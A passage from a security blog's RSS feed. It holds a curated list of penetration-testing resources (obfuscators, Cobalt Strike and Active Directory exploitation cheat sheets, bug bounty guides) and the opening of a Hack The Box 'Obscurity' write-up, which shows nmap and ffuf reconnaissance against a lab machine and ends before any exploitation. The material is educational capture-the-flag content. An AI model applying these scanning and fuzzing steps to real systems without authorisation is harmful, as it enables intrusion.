				<li><a href="https://github.com/Coalfire-Research/npk">https://github.com/Coalfire-Research/npk</a> <strong>&lt;&mdash;&mdash; Distributed hash-cracking platform on serverless AWS componentes</strong></li>
				<li><a href="https://hashcat.net/wiki/doku.php?id=example_hashes">https://hashcat.net/wiki/doku.php?id=example_hashes</a></li>
				<li><a href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></li>
				<li><a href="https://github.com/rapid7/ssh-badkeys">https://github.com/rapid7/ssh-badkeys</a></li>
				<li><a href="https://crackstation.net/">https://crackstation.net/</a></li>
				</ul>
				<h4 id="compiling-exploits">Compiling exploits</h4>
				<ul>
				<li><a href="https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage">https://stackoverflow.com/questions/4032373/linking-against-an-old-version-of-libc-to-provide-greater-application-coverage</a></li>
				<li><a href="https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html">https://www.lordaro.co.uk/posts/2018-08-26-compiling-glibc.html</a></li>
				<li><a href="https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/">https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/</a></li>
				</ul>
				<h4 id="obfuscators">Obfuscators</h4>
				<ul>
				<li><a href="https://github.com/danielbohannon/Invoke-Obfuscation">https://github.com/danielbohannon/Invoke-Obfuscation</a></li>
				<li><a href="https://github.com/Bashfuscator/Bashfuscator">https://github.com/Bashfuscator/Bashfuscator</a></li>
				</ul>
				<h4 id="deobfuscators">Deobfuscators</h4>
				<ul>
				<li><a href="https://www.unphp.net/">https://www.unphp.net/</a></li>
				<li><a href="https://lelinhtinh.github.io/de4js/">https://lelinhtinh.github.io/de4js/</a></li>
				<li><a href="http://jsnice.org/">http://jsnice.org/</a></li>
				<li><a href="https://github.com/java-deobfuscator/deobfuscator">https://github.com/java-deobfuscator/deobfuscator</a></li>
				</ul>
				<h4 id="buffer-overflows">Buffer Overflows</h4>
				<ul>
				<li><a href="https://github.com/justinsteven/dostackbufferoverflowgood">https://github.com/justinsteven/dostackbufferoverflowgood</a></li>
				<li><a href="https://github.com/stephenbradshaw/vulnserver">https://github.com/stephenbradshaw/vulnserver</a></li>
				<li><a href="https://www.vulnhub.com/entry/brainpan-1,51/">https://www.vulnhub.com/entry/brainpan-1,51/</a></li>
				<li><a href="https://exploit.education/phoenix/">https://exploit.education/phoenix/</a></li>
				<li><a href="https://www.youtube.com/watch?v=1S0aBV-Waeo">https://www.youtube.com/watch?v=1S0aBV-Waeo</a></li>
				</ul>
				<h4 id="general-hacking-cheatsheetscool-articlespodcasts">General Hacking Cheatsheets/Cool Articles/Podcasts</h4>
				<ul>
				<li><a href="https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md">https://github.com/tagnullde/OSCP/blob/master/oscp-cheatsheet.md</a></li>
				<li><a href="https://github.com/Optixal/OSCP-PWK-Notes-Public/">https://github.com/Optixal/OSCP-PWK-Notes-Public/</a></li>
				<li><a href="https://github.com/OlivierLaflamme/Cheatsheet-God/">https://github.com/OlivierLaflamme/Cheatsheet-God/</a></li>
				<li><a href="https://github.com/sinfulz/JustTryHarder/">https://github.com/sinfulz/JustTryHarder/</a></li>
				<li><a href="https://github.com/0x4D31/awesome-oscp">https://github.com/0x4D31/awesome-oscp</a></li>
				<li><a href="https://github.com/xapax/security">https://github.com/xapax/security</a></li>
				<li><a href="https://book.hacktricks.xyz/">https://book.hacktricks.xyz/</a></li>
				<li><a href="https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html">https://0xdf.gitlab.io/2018/12/02/pwk-notes-smb-enumeration-checklist-update1.html</a></li>
				<li><a href="https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html">https://www.netsecfocus.com/oscp/2019/03/29/The_Journey_to_Try_Harder-_TJNulls_Preparation_Guide_for_PWK_OSCP.html</a></li>
				<li><a href="https://github.com/Hack-with-Github/Awesome-Hacking">https://github.com/Hack-with-Github/Awesome-Hacking</a></li>
				<li><a href="https://jhalon.github.io/becoming-a-pentester/">https://jhalon.github.io/becoming-a-pentester/</a></li>
				<li><a href="https://www.inteltechniques.com/podcast.html">https://www.inteltechniques.com/podcast.html</a></li>
				<li><a href="https://darknetdiaries.com/">https://darknetdiaries.com/</a></li>
				<li><a href="https://lobuhisec.medium.com/kubernetes-pentest-recon-checklist-tools-and-resources-30d8e4b69463">https://lobuhisec.medium.com/kubernetes-pentest-recon-checklist-tools-and-resources-30d8e4b69463</a></li>
				</ul>
				<h4 id="cobalt-strike">Cobalt Strike</h4>
				<ul>
				<li><a href="https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet">https://github.com/S1ckB0y1337/Cobalt-Strike-CheatSheet</a></li>
				</ul>
				<h4 id="bug-bountyweb-security">Bug Bounty/Web Security</h4>
				<ul>
				<li><a href="https://owasp.org/www-project-top-ten/">https://owasp.org/www-project-top-ten/</a></li>
				<li><a href="https://www.hackerone.com/blog/Guide-Subdomain-Takeovers">https://www.hackerone.com/blog/Guide-Subdomain-Takeovers</a></li>
				<li><a href="https://0xpatrik.com/subdomain-takeover-ns/">https://0xpatrik.com/subdomain-takeover-ns/</a></li>
				<li><a href="https://github.com/OWASP/wstg">https://github.com/OWASP/wstg</a></li>
				<li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/">https://github.com/swisskyrepo/PayloadsAllTheThings/</a></li>
				<li><a href="https://tomnomnom.com/talks/bug-bounties-with-bash-virsec.pdf">https://tomnomnom.com/talks/bug-bounties-with-bash-virsec.pdf</a></li>
				<li><a href="https://docs.google.com/presentation/d/1DAQ47VjIaQZ88Ly00eGPQupq79hAF9AAZstV7OVCY_8">https://docs.google.com/presentation/d/1DAQ47VjIaQZ88Ly00eGPQupq79hAF9AAZstV7OVCY_8</a></li>
				<li><a href="https://github.com/ngalongc/bug-bounty-reference">https://github.com/ngalongc/bug-bounty-reference</a></li>
				<li><a href="https://gowsundar.gitbook.io/book-of-bugbounty-tips">https://gowsundar.gitbook.io/book-of-bugbounty-tips</a></li>
				<li><a href="https://github.com/jdonsec/AllThingsSSRF">https://github.com/jdonsec/AllThingsSSRF</a></li>
				<li><a href="https://github.com/jdonsec/AllThingsXXE">https://github.com/jdonsec/AllThingsXXE</a></li>
				<li><a href="https://xsleaks.com/">https://xsleaks.com/</a></li>
				<li><a href="https://www.reddit.com/r/bugbounty/comments/983odf/how_to_become_a_bug_bounty_hunter/">https://www.reddit.com/r/bugbounty/comments/983odf/how_to_become_a_bug_bounty_hunter/</a></li>
				<li><a href="https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/">https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/</a></li>
				<li><a href="https://blog.usejournal.com/bug-hunting-methodology-part-1-91295b2d2066">https://blog.usejournal.com/bug-hunting-methodology-part-1-91295b2d2066</a> **&lt;&mdash;&mdash; Serie of 3 post about Bug Hunting Methodology **</li>
				<li><a href="https://github.com/ngalongc/bug-bounty-reference">https://github.com/ngalongc/bug-bounty-reference</a></li>
				<li><a href="https://pentester.land/list-of-bug-bounty-writeups.html">https://pentester.land/list-of-bug-bounty-writeups.html</a></li>
				<li><a href="https://twitter.com/FaniMalikHack/status/1355145481479999488">https://twitter.com/FaniMalikHack/status/1355145481479999488</a> **&lt;&mdash;&mdash; Tweet by @FaniMalikHack with an infographic about JWT  **</li>
				</ul>
				<h4 id="subdomain-finders">Subdomain finders</h4>
				<ul>
				<li><a href="https://github.com/projectdiscovery/subfinder">https://github.com/projectdiscovery/subfinder</a></li>
				<li><a href="https://github.com/guelfoweb/knock">https://github.com/guelfoweb/knock</a></li>
				<li><a href="https://crt.sh/">https://crt.sh/</a></li>
				<li><a href="https://shodan.io/">https://shodan.io/</a></li>
				<li><a href="https://censys.io/ipv4/">https://censys.io/ipv4/</a></li>
				<li><a href="https://securitytrails.com/">https://securitytrails.com/</a></li>
				<li><a href="https://github.com/OWASP/Amass">https://github.com/OWASP/Amass</a></li>
				<li><a href="https://www.crunchbase.com/search/acquisitions">https://www.crunchbase.com/search/acquisitions</a> **&lt;&mdash;&mdash; Discovering searching by acquisitions **</li>
				</ul>
				<h4 id="subdomain-takeover">Subdomain takeover</h4>
				<ul>
				<li><a href="https://github.com/EdOverflow/can-i-take-over-xyz">https://github.com/EdOverflow/can-i-take-over-xyz</a></li>
				<li><a href="https://github.com/projectdiscovery/nuclei">https://github.com/projectdiscovery/nuclei</a></li>
				</ul>
				<h4 id="discovering-of-target-by-using-asn-ip-blocks-and-reverse-whois">Discovering of Target by using ASN (IP Blocks) and reverse whois</h4>
				<ul>
				<li><a href="https://bgp.he.net/">https://bgp.he.net/</a></li>
				<li><a href="https://apps.db.ripe.net/db-web-ui/#/fulltextsearch">https://apps.db.ripe.net/db-web-ui/#/fulltextsearch</a></li>
				<li><a href="https://whois.arin.net/ui/query.do">https://whois.arin.net/ui/query.do</a></li>
				<li><a href="https://whoxy.com/">https://whoxy.com/</a></li>
				<li><a href="https://github.com/vysecurity/DomLink">https://github.com/vysecurity/DomLink</a></li>
				</ul>
				<h4 id="screenshotting">Screenshotting</h4>
				<ul>
				<li><a href="https://github.com/michenriksen/aquatone">https://github.com/michenriksen/aquatone</a></li>
				<li><a href="https://github.com/FortyNorthSecurity/EyeWitness">https://github.com/FortyNorthSecurity/EyeWitness</a></li>
				<li><a href="https://github.com/breenmachine/httpscreenshot">https://github.com/breenmachine/httpscreenshot</a></li>
				<li><a href="https://github.com/maaaaz/webscreenshot">https://github.com/maaaaz/webscreenshot</a></li>
				</ul>
				<h4 id="red-team">Red Team</h4>
				<ul>
				<li><a href="https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki">https://github.com/bluscreenofjeff/Red-Team-Infrastructure-Wiki</a></li>
				<li><a href="https://www.ired.team/">https://www.ired.team/</a></li>
				<li><a href="https://www.harmj0y.net/blog/">https://www.harmj0y.net/blog/</a> **&lt;&mdash;&mdash; Awesome Active Directory Posts **</li>
				<li><a href="https://malicious.link/post/2016/kerberoast-pt1/">https://malicious.link/post/2016/kerberoast-pt1/</a> <strong>&lt;&mdash;&mdash; Serie about Kerberoasting (5 posts)</strong></li>
				<li><a href="https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet">https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet</a></li>
				</ul>
				<h4 id="cool-presentationsvideos">Cool presentations/videos</h4>
				<ul>
				<li>A New Era Of SSRF: Exploiting Url Parsrs - Orange Tsai <a href="https://www.youtube.com/watch?v=D1S-G8rJrEk">https://www.youtube.com/watch?v=D1S-G8rJrEk</a></li>
				<li>HTTP Desync Attacks: Smashing into the Cell Next Door - albinowax <a href="https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;t=1622s">https://www.youtube.com/watch?v=w-eJM2Pc0KI&amp;t=1622s</a></li>
				<li>A $7.500 BUG BOUNTY Bug Explained, step by step. (Blind XXE OOB over DNS) - STOK <a href="https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;t=26s&amp;pbjreload=101">https://www.youtube.com/watch?v=aSiIHKeN3ys&amp;t=26s&amp;pbjreload=101</a></li>
				<li>GitHub Recon and Sensitive Data Exposure <a href="https://youtu.be/l0YsEk_59fQ">https://youtu.be/l0YsEk_59fQ</a></li>
				<li>Cracking the Lens: Targeting HTTP&rsquo;s Hidden Attack-Surface <a href="https://www.youtube.com/watch?v=zP4b3pw94s0">https://www.youtube.com/watch?v=zP4b3pw94s0</a></li>
				<li>How to Crush Bug Bounties in the first 12 Months <a href="https://www.youtube.com/watch?v=AbebbJ3cRLI">https://www.youtube.com/watch?v=AbebbJ3cRLI</a></li>
				<li>The Bug Hunter&rsquo;s Methodology v4.0 - Recon Edition by @jhaddix​ at #NahamCon2020​ <a href="https://youtu.be/p4JgIu1mceI">https://youtu.be/p4JgIu1mceI</a></li>
				<li>How i became a HackerOne MVH without writing a single line of python (Motivational talk) by STOK <a href="https://youtu.be/4YjCta2fcbw">https://youtu.be/4YjCta2fcbw</a></li>
				<li>My Journey to Cybersecurity CIA Keynote - Heath Adams (aka The Cyber Mentor) <a href="https://www.youtube.com/watch?v=q4h8A5dQsZw">https://www.youtube.com/watch?v=q4h8A5dQsZw</a></li>
				</ul>
				<h4 id="cool-books">Cool Books</h4>
				<ul>
				<li><a href="https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470">https://www.amazon.com/Web-Application-Hackers-Handbook-Exploiting/dp/1118026470</a></li>
				<li><a href="https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/">https://www.amazon.com/Real-World-Bug-Hunting-Field-Hacking/dp/1593278616/</a></li>
				<li><a href="https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/">https://www.amazon.com/How-Linux-Works-2nd-Superuser/dp/1593275676/</a></li>
				</ul>
				<h4 id="hackers-to-follow-on-twitter-its-a-really-awesome-way-to-learn-as-well-will-keep-adding-them">Hackers to follow on twitter (it&rsquo;s a really awesome way to learn as well!. Will keep adding them)</h4>
				<ul>
				<li>securibee: <a href="https://twitter.com/securibee">https://twitter.com/securibee</a></li>
				<li>codingo_: <a href="https://twitter.com/codingo_">https://twitter.com/codingo_</a></li>
				<li>hakluke: <a href="https://twitter.com/hakluke">https://twitter.com/hakluke</a></li>
				<li>JackRhysider: <a href="https://twitter.com/JackRhysider">https://twitter.com/JackRhysider</a></li>
				<li>Orange Tsai: <a href="https://twitter.com/orange_8361">https://twitter.com/orange_8361</a></li>
				<li>MalwareTech: <a href="https://twitter.com/MalwareTechBlog">https://twitter.com/MalwareTechBlog</a></li>
				<li>TomTomNom: <a href="https://twitter.com/TomNomNom">https://twitter.com/TomNomNom</a></li>
				<li>Jason Haddix: <a href="https://twitter.com/Jhaddix">https://twitter.com/Jhaddix</a></li>
				<li>NahamSec: <a href="https://twitter.com/NahamSec">https://twitter.com/NahamSec</a></li>
				<li>STOK: <a href="https://twitter.com/stokfredrik">https://twitter.com/stokfredrik</a></li>
				<li>John Hammond: <a href="https://twitter.com/_johnhammond">https://twitter.com/_johnhammond</a></li>
				<li>Jake Williams: <a href="https://twitter.com/MalwareJake">https://twitter.com/MalwareJake</a></li>
				<li>Deviant Ollman: <a href="https://twitter.com/deviantollam">https://twitter.com/deviantollam</a></li>
				<li>J3rryBl4nks: <a href="https://twitter.com/JBl4nks">https://twitter.com/JBl4nks</a></li>
				<li>Tib3rius: <a href="https://twitter.com/0xTib3rius">https://twitter.com/0xTib3rius</a></li>
				<li>TheColonial: <a href="https://twitter.com/TheColonial">https://twitter.com/TheColonial</a></li>
				<li>Rob Fuller: <a href="https://twitter.com/mubix">https://twitter.com/mubix</a></li>
				<li>g0tmi1k: <a href="https://twitter.com/g0tmi1k">https://twitter.com/g0tmi1k</a></li>
				<li>TJ_Null: <a href="https://twitter.com/TJ_Null">https://twitter.com/TJ_Null</a></li>
				<li>Rasta Mouse: <a href="https://twitter.com/_RastaMouse">https://twitter.com/_RastaMouse</a></li>
				<li>ippsec: <a href="https://twitter.com/ippsec">https://twitter.com/ippsec</a></li>
				<li>Chema Alonso: <a href="https://twitter.com/chemaalonso">https://twitter.com/chemaalonso</a></li>
				</ul>
				]]>
			</content>
		</item>
		<item>
			<title>
				Hack The Box - Obscurity
			</title>
			<link>
				https://pruthvirajbhat.github.io/posts/2020/05/hack-the-box-obscurity/
			</link>
			<pubDate>
				Thu, 14 May 2020 00:00:00 +0000
			</pubDate>
			<guid>
				https://pruthvirajbhat.github.io/posts/2020/05/hack-the-box-obscurity/
			</guid>
			<description>
				Quick Summary Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&amp;rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&amp;rsquo;t read it you can click here to go to it
				I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&amp;hellip;I will try to do them as my time allows me hehe.
			</description>
			<content type="html">
				<![CDATA[
				<img src="/images/htb/obscurity/info-card.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<h2 id="quick-summary">Quick Summary</h2>
				<p>Well, the last months I have been really away from doing write-ups, specifically due to being full focused on my OSCP which I still can&rsquo;t belive I passed!! I did an extensive write up about my experience going through it, if you still haven&rsquo;t read it <a href="https://pruthvirajbhat.github.io/posts/2020/04/a-journey-in-the-dark-an-adventures-tale-towards-oscp/">you can click here to go to it</a></p>
				<p>I have more machines to do a write-up of, for example some of them are Postman, Traverxec, Mango, SolidState, OpenAdmin, Chatter Box among others, but well&hellip;I will try to do them as my time allows me hehe.</p>
				<p>For today I just decided to write about Obscurity, which I remember when I did it, it was pretty fun, I enjoyed it quite a lot, and it teach me some nice stuff, still remember when I did it I was struggling a bit with the Python stuff and my bro <a href="https://bullsec.xyz/">MrBulldops</a> gave me a hand to understand it a bit better.</p>
				<p>Well, Obscurity is a Linux medium machine, mostly using Python stuff and as the name says before hand, the concept in this one is security by obscurity, so it doesn&rsquo;t use standard web servers and so on, instead it use custom stuff in order to &ldquo;provide security&rdquo; by there being not public ways to exploit it, so you are forced to do some code review, think outside the box, etc.</p>
				<p>Cutting the chit-chat let&rsquo;s go into the write up!</p>
				<h2 id="nmap">Nmap</h2>
				<p>We start with nmap to see which ports are there open:</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# nmap -sC -sV -O  10.10.10.168 -o initial-nmap-obscurity.htb
				Starting Nmap 7.80 ( https://nmap.org ) at 2019-12-17 16:42 EST
				Nmap scan report for 10.10.10.168
				Host is up (0.084s latency).
				Not shown: 996 filtered ports
				PORT     STATE  SERVICE    VERSION
				22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
				| ssh-hostkey:
				|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
				|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
				|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
				80/tcp   closed http
				8080/tcp open   http-proxy BadHTTPServer
				| fingerprint-strings:
				|   GetRequest:
				|     HTTP/1.1 200 OK
				|     Date: Tue, 17 Dec 2019 21:42:22
				|     Server: BadHTTPServer
				|     Last-Modified: Tue, 17 Dec 2019 21:42:22
				|     Content-Length: 4171
				|     Content-Type: text/html
				|     Connection: Closed
				|     &lt;!DOCTYPE html&gt;
				|     &lt;html lang=&quot;en&quot;&gt;
				|     &lt;head&gt;
				|     &lt;meta charset=&quot;utf-8&quot;&gt;
				|     &lt;title&gt;0bscura&lt;/title&gt;
				|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt;
				|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
				|     &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
				|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
				|     &lt;!--
				|     Easy Profile Template
				|     http://www.templatemo.com/tm-467-easy-profile
				|     &lt;!-- stylesheet css --&gt;
				|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
				|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
				|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/templatemo-blue.css&quot;&gt;
				|     &lt;/head&gt;
				|     &lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar-collapse&quot;&gt;
				|     &lt;!-- preloader section --&gt;
				|     &lt;!--
				|     &lt;div class=&quot;preloader&quot;&gt;
				|     &lt;div class=&quot;sk-spinner sk-spinner-wordpress&quot;&gt;
				|   HTTPOptions:
				|     HTTP/1.1 200 OK
				|     Date: Tue, 17 Dec 2019 21:42:23
				|     Server: BadHTTPServer
				|     Last-Modified: Tue, 17 Dec 2019 21:42:23
				|     Content-Length: 4171
				|     Content-Type: text/html
				|     Connection: Closed
				|     &lt;!DOCTYPE html&gt;
				|     &lt;html lang=&quot;en&quot;&gt;
				|     &lt;head&gt;
				|     &lt;meta charset=&quot;utf-8&quot;&gt;
				|     &lt;title&gt;0bscura&lt;/title&gt;
				|     &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge&quot;&gt;
				|     &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;
				|     &lt;meta name=&quot;keywords&quot; content=&quot;&quot;&gt;
				|     &lt;meta name=&quot;description&quot; content=&quot;&quot;&gt;
				|     &lt;!--
				|     Easy Profile Template
				|     http://www.templatemo.com/tm-467-easy-profile
				|     &lt;!-- stylesheet css --&gt;
				|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/bootstrap.min.css&quot;&gt;
				|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/font-awesome.min.css&quot;&gt;
				|     &lt;link rel=&quot;stylesheet&quot; href=&quot;css/templatemo-blue.css&quot;&gt;
				|     &lt;/head&gt;
				|     &lt;body data-spy=&quot;scroll&quot; data-target=&quot;.navbar-collapse&quot;&gt;
				|     &lt;!-- preloader section --&gt;
				|     &lt;!--
				|     &lt;div class=&quot;preloader&quot;&gt;
				|_    &lt;div class=&quot;sk-spinner sk-spinner-wordpress&quot;&gt;
				|_http-server-header: BadHTTPServer
				|_http-title: 0bscura
				9000/tcp closed cslistener
				1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
				SF-Port8080-TCP:V=7.80%I=7%D=12/17%Time=5DF94BCA%P=x86_64-pc-linux-gnu%r(G
				SF:etRequest,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x20Tue,\x2017\x20Dec\x202
				SF:019\x2021:42:22\nServer:\x20BadHTTPServer\nLast-Modified:\x20Tue,\x2017
				SF:\x20Dec\x202019\x2021:42:22\nContent-Length:\x204171\nContent-Type:\x20
				SF:text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20html&gt;\n&lt;html\x20lang=\
				SF:&quot;en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\t&lt;title&gt;0bscura&lt;/title&gt;
				SF:\n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20content=\&quot;IE=Edge\&quot;&gt;\n\t
				SF:&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=device-width,\x20initial-
				SF:scale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20content=\&quot;\&quot;&gt;\n\t&lt;meta\x20n
				SF:ame=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\nEasy\x20Profile\x20Temp
				SF:late\nhttp://www\.templatemo\.com/tm-467-easy-profile\n--&gt;\n\t&lt;!--\x20s
				SF:tylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/bo
				SF:otstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/font-
				SF:awesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;stylesheet\&quot;\x20href=\&quot;css/templ
				SF:atemo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\&quot;scroll\&quot;\x20data-targe
				SF:t=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x20section\x20--&gt;\n&lt;!--\n
				SF:&lt;div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;sk-spinner\x20sk-spinne
				SF:r-wordpress\&quot;&gt;\n&quot;)%r(HTTPOptions,10FC,&quot;HTTP/1\.1\x20200\x20OK\nDate:\x2
				SF:0Tue,\x2017\x20Dec\x202019\x2021:42:23\nServer:\x20BadHTTPServer\nLast-
				SF:Modified:\x20Tue,\x2017\x20Dec\x202019\x2021:42:23\nContent-Length:\x20
				SF:4171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x2
				SF:0html&gt;\n&lt;html\x20lang=\&quot;en\&quot;&gt;\n&lt;head&gt;\n\t&lt;meta\x20charset=\&quot;utf-8\&quot;&gt;\n\
				SF:t&lt;title&gt;0bscura&lt;/title&gt;\n\t&lt;meta\x20http-equiv=\&quot;X-UA-Compatible\&quot;\x20c
				SF:ontent=\&quot;IE=Edge\&quot;&gt;\n\t&lt;meta\x20name=\&quot;viewport\&quot;\x20content=\&quot;width=de
				SF:vice-width,\x20initial-scale=1\&quot;&gt;\n\t&lt;meta\x20name=\&quot;keywords\&quot;\x20cont
				SF:ent=\&quot;\&quot;&gt;\n\t&lt;meta\x20name=\&quot;description\&quot;\x20content=\&quot;\&quot;&gt;\n&lt;!--\x20\n
				SF:Easy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pr
				SF:ofile\n--&gt;\n\t&lt;!--\x20stylesheet\x20css\x20--&gt;\n\t&lt;link\x20rel=\&quot;styles
				SF:heet\&quot;\x20href=\&quot;css/bootstrap\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;styleshee
				SF:t\&quot;\x20href=\&quot;css/font-awesome\.min\.css\&quot;&gt;\n\t&lt;link\x20rel=\&quot;styleshee
				SF:t\&quot;\x20href=\&quot;css/templatemo-blue\.css\&quot;&gt;\n&lt;/head&gt;\n&lt;body\x20data-spy=\
				SF:&quot;scroll\&quot;\x20data-target=\&quot;\.navbar-collapse\&quot;&gt;\n\n&lt;!--\x20preloader\x2
				SF:0section\x20--&gt;\n&lt;!--\n&lt;div\x20class=\&quot;preloader\&quot;&gt;\n\t&lt;div\x20class=\&quot;
				SF:sk-spinner\x20sk-spinner-wordpress\&quot;&gt;\n&quot;);
				Aggressive OS guesses: Linux 3.2 - 4.9 (94%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.18 (92%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Linux 3.16 (91%), Crestron XPanel control system (91%), Android 4.1.1 (91%), Adtran 424RG FTTH gateway (90%), Linux 2.6.32 (90%)
				No exact OS matches for host (test conditions non-ideal).
				Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
				
				OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
				Nmap done: 1 IP address (1 host up) scanned in 26.20 seconds
				</code></pre><p>We got port port 22 (SSH) and 8080 (HTTP Alternative) as open, and a header &ldquo;BadHTTPServer&rdquo; in port 8080.</p>
				<h2 id="web-enumeration">Web enumeration</h2>
				<p>From this on, we start doing some manual web enumeration, to see if we find something interesting for us.
				There are some sections in the page talking about the service by obscurity and providing information on another &ldquo;products&rdquo; that are built by &ldquo;the company&rdquo; as well some contact information.</p>
				
				<img src="/images/htb/obscurity/1-webenum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/obscurity/2-webenum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				
				<img src="/images/htb/obscurity/3-webenum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>In the bottom of the page, there was a mention to &ldquo;Easy Profile&rdquo;:</p>
				
				<img src="/images/htb/obscurity/4-webenum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>I look up on google for this, and I found this:</p>
				
				<img src="/images/htb/obscurity/5-webenum.png"  class="center"  style="border-radius: 8px;"  />
				
				
				<p>After trying to enumerate a few more stuff without any luck, I notice is a rabbit hole and just move on.
				I run gobuster against the server, but no luck, it didn&rsquo;t find any directory, common file, absolutely nothing under the server, the only ports we have are ssh and the http 8080, being ssh is almost not possible to be the foothold, and keeping in mind the name of the machine, I decide to move into fuzzing the server to see if I can find anything usefull that gobuster was not able to find. For this I decide to use <code>ffuf</code> (I don&rsquo;t like wfuzz, neither it&rsquo;s syntax and also I consider it to be slow compared to ffuf), <a href="https://github.com/ffuf/ffuf">you can get ffuf here</a>.</p>
				<p>Then I proceed to fuzze the server and I got some interesting results:</p>
				<pre><code class="language-console" data-lang="console">root@kali:~/Documents/HTB/boxes/medium/linux/obscurity# ffuf -D -mc 200 -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -o obscurity-ffuf.htb
				
				/'___\  /'___\           /'___\
				/\ \__/ /\ \__/  __  __  /\ \__/
				\ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
				\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
				\ \_\   \ \_\  \ \____/  \ \_\
				\/_/    \/_/   \/___/    \/_/
				
				v0.12
				________________________________________________
				
				:: Method           : GET
				:: URL              : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
				:: Output file      : obscurity-ffuf.htb
				:: File format      : json
				:: Follow redirects : false
				:: Calibration      : false
				:: Timeout          : 10
				:: Threads          : 40
				:: Matcher          : Response status: 200
				________________________________________________
				
				--- SNIP ---
				develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
				:: Progress: [87664/87664] :: 306 req/sec :: Duration: [0:04:46] :: Errors: 4 ::
				</code></pre><p><code>SuperSecureServer.py</code> under <code>develop</code> was found, which is something that sounds quite inteteresting, I open my browser and go against <code>http://10.10.10.168:8080/develop/SuperSecureServer.py</code>, and the next code is show:</p>
